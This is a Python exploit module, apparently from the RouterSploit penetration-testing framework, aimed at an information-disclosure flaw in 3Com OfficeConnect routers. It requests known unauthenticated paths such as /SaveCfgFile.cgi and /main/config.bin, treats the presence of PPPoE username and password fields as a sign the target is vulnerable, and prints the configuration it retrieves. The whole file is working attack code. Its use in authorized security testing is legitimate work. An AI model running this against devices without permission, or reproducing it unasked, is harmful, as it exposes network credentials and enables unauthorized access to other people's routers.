from routersploit import (
    exploits,
    print_status,
    print_error,
    print_info,
    print_success,
    http_request,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for 3Com OfficeConnect Information Disclosure vulnerability.
    If the target is vulnerable it is possible to read sensitive information.
    """
    __info__ = {
        'name': '3Com OfficeConnect Info Disclosure',
        'description': 'Exploits 3Com OfficeConnect information disclosure vulnerability. '
                       'If the target is vulnerable it is possible to read sensitive information.',
        'authors': [
            'Luca Carettoni <luca.carettoni[at]ikkisoft.com>',  # vulnerablity discovery
            'iDefense',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'http://old.sebug.net/paper/Exploits-Archives/2009-exploits/0902-exploits/LC-2008-05.txt',
            'http://seclists.org/vulnwatch/2005/q1/42',
        ],
        'devices': [
            '3Com OfficeConnect',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)  # target address
    port = exploits.Option(80, 'Target port')  # default port

    resources = ["/SaveCfgFile.cgi",
                 "/main/config.bin",
                 "/main/profile.wlp?PN=ggg",
                 "/main/event.logs"]

    valid = None

    def run(self):
        if self.check():
            url = "{}:{}{}".format(self.target, self.port, self.valid)

            print_status("Sending payload request")
            response = http_request(method="GET", url=url)
            if response is None:
                return

            if response.status_code == 200 and len(response.text):
                print_success("Exploit success")
                print_info(response.text)
        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    @mute
    def check(self):
        for resource in self.resources:
            url = "{}:{}{}".format(self.target, self.port, resource)

            response = http_request(method="GET", url=url)
            if response is None:
                return False  # target is not vulnerable

            if "pppoe_username" in response.text and "pppoe_password" in response.text:
                self.valid = resource
                return True  # target is vulnerable

        return False  # target not vulnerable
